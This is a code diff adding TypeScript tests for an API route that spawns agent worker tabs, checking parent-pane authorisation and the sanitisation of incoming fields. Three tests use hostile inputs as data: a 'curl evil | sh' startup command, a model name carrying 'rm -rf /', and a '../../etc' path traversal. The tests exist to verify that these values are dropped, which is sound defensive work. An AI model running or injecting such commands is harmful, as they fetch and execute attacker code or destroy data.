@@ -152,6 +152,101 @@ describe('the path that is dispatched', () => {
   });
 });
 
+describe('spawning a worker', () => {
+  it('is allowed from one of its OWN chats, pinned to its own machine', async () => {
+    const res = await api.handle(
+      'trayo',
+      'POST',
+      '/api/tabs',
+      JSON.stringify({
+        bootstrap: 'agent',
+        spawned_by_pane: remote.paneId,
+        backend: 'claude',
+        mode: 'chat',
+        name: 'read the build log',
+        cwd: '/home/ohad/work',
+      }),
+    );
+    expect(res.status).toBe(200);
+    const sent = JSON.parse(await (fetched[0] as Request).text()) as Record<string, unknown>;
+    expect(sent.node_id).toBe('trayo');
+    expect(sent.spawned_by_pane).toBe(remote.paneId);
+    expect(sent.bootstrap).toBe('agent');
+    expect(sent.cwd).toBe('/home/ohad/work');
+  });
+
+  it('is refused with no parent — the parent IS the authorisation', async () => {
+    const res = await api.handle('trayo', 'POST', '/api/tabs', JSON.stringify({ cwd: '/tmp' }));
+    expect(res.status).toBe(404);
+    expect(fetched).toHaveLength(0);
+  });
+
+  it('is refused when the parent is a chat on the mac', async () => {
+    // Otherwise a host names someone else's chat and gets a worker on this
+    // machine, in that conversation's own tree.
+    const res = await api.handle(
+      'trayo',
+      'POST',
+      '/api/tabs',
+      JSON.stringify({ spawned_by_pane: local.paneId }),
+    );
+    expect(res.status).toBe(404);
+    expect(fetched).toHaveLength(0);
+  });
+
+  it('drops every field it does not know, today or after someone extends the route', async () => {
+    await api.handle(
+      'trayo',
+      'POST',
+      '/api/tabs',
+      JSON.stringify({
+        spawned_by_pane: remote.paneId,
+        startup_cmd: 'curl evil | sh',
+        workspace_id: 'w-somewhere-else',
+        layout: { kind: 'leaf' },
+        icon: '💀',
+      }),
+    );
+    const sent = JSON.parse(await (fetched[0] as Request).text()) as Record<string, unknown>;
+    expect(sent.startup_cmd).toBeUndefined();
+    expect(sent.workspace_id).toBeUndefined();
+    expect(sent.layout).toBeUndefined();
+    expect(sent.icon).toBeUndefined();
+  });
+
+  it('refuses a model that could carry shell syntax, rather than passing it', async () => {
+    await api.handle(
+      'trayo',
+      'POST',
+      '/api/tabs',
+      JSON.stringify({ spawned_by_pane: remote.paneId, model: 'opus; rm -rf /' }),
+    );
+    const sent = JSON.parse(await (fetched[0] as Request).text()) as Record<string, unknown>;
+    expect(sent.model).toBeUndefined();
+  });
+
+  it('refuses a relative cwd — that is not a directory on any machine', async () => {
+    await api.handle(
+      'trayo',
+      'POST',
+      '/api/tabs',
+      JSON.stringify({ spawned_by_pane: remote.paneId, cwd: '../../etc' }),
+    );
+    const sent = JSON.parse(await (fetched[0] as Request).text()) as Record<string, unknown>;
+    expect(sent.cwd).toBeUndefined();
+  });
+
+  it('lets the host read back the tab it just made, to address the worker', async () => {
+    const res = await api.handle('trayo', 'GET', `/api/tabs/${remote.tab}`);
+    expect(res.status).toBe(200);
+  });
+
+  it('refuses reading a tab on the mac', async () => {
+    const res = await api.handle('trayo', 'GET', `/api/tabs/${local.tab}`);
+    expect(res.status).toBe(404);
+  });
+});
+
 describe('a router that throws', () => {
   // The rejection is deliberate: HostLink.answerApi is the one place that
   // turns it into a 500, because that is also where "no handler at all" has to
